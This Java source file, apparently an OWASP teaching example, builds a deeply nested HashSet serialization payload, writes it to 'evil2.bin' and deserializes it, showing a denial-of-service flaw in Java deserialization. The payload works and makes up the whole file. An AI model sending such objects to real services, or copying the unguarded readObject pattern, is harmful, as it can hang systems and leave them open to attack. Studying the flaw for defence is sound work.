package it.aizoon.owasp4;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.util.HashSet;
import java.util.Set;

public class JavaSerializationExample2 {


  private static Object getEvilObject() {
    Set root = new HashSet();
    Set s1 = root;
    Set s2 = new HashSet();
    for (int i = 0; i < 100; i++) {
      Set t1 = new HashSet();
      Set t2 = new HashSet();
      t1.add("foo"); // make it not equal to t2
      s1.add(t1);
      s1.add(t2);
      s2.add(t1);
      s2.add(t2);
      s1 = t1;
      s2 = t2;
    }
    return root;
  }

  public static void main(String[] args) throws Exception{

    //write file
    FileOutputStream fileOutputStream = new FileOutputStream("evil2.bin");
    ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
    objectOutputStream.writeObject(getEvilObject());
    objectOutputStream.close();
    System.out.println("---- file created! ----");


    //read file
    FileInputStream fileIn = new FileInputStream("evil2.bin");
    ObjectInputStream objectIn = new ObjectInputStream(fileIn);
    Object obj = objectIn.readObject();
    System.out.println("The Object has been read from the file");
    objectIn.close();
  }
}
